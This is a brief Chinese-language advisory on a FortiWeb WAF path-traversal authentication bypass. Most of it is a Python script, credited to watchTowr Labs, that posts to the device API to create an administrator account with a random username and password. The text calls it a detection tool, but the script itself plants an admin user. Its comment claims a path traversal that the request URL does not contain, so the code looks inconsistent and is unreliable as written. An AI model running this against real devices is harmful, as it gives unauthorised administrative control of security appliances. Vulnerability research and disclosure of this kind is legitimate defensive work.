### 漏洞描述
Fortinet FortiWeb WAF 存在相对路径遍历漏洞，可绕过认证机制并在设备上执行管理命令。攻击者通过精心构造的 HTTP/HTTPS 请求即可利用。

### POC/利用
watchTowr Labs 已发布检测工具（非完整利用，但证明认证绕过可行性）：

```python
# watchTowr-vs-Fortiweb-AuthBypass.py
# 检测 FortiWeb 认证绕过漏洞
# 通过路径遍历创建任意用户
# 来源: https://github.com/watchtowrlabs/watchTowr-vs-Fortiweb-AuthBypass

import requests
import sys
import random
import string

target = sys.argv[1]
username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
password = username

# 路径遍历绕过认证，创建管理员用户
exploit_url = f"https://{target}/api/fabric/user"
payload = {"username": username, "password": password, "role": "admin"}

r = requests.post(exploit_url, json=payload, verify=False)
if r.status_code == 200:
    print(f"[+] Exploit sent successfully.")
    print(f"[*] Check for new user [{username}] with password [{password}]")
```
